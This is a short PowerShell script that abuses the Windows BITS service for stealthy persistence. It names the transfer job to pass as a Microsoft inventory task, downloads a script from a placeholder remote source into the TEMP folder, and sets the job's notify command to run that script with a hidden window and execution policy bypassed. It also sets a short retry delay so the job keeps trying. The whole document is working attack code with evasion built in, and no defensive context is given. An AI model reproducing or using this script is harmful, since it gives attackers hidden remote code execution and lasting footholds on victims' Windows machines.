# 1. Define a 'boring' job name and a fake source/destination
$jobName = "MicrosoftWindowsInventorySync"
$source = "MY-DOMAIN"
$dest = "$env:TEMP\win_sync.ps1"

# 2. Create the asynchronous job
$job = Start-BitsTransfer -Source $source -Destination $dest -Asynchronous -DisplayName $jobName -Priority Low

# 3. Set the 'Notify' command. 
# NOTE: The first parameter is the program, the second is the ARGUMENT string.
# BITS requires the first part of the argument to be the program name again.
Set-BitsTransfer -BitsJob $job -SetNotifyCmdLine "powershell.exe", "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $dest"

# 4. Set a retry delay (e.g., 60 seconds) so if it fails, it tries again quickly
# This is a 'bitsadmin' fallback for precise control
bitsadmin /setminretrydelay $jobName 60
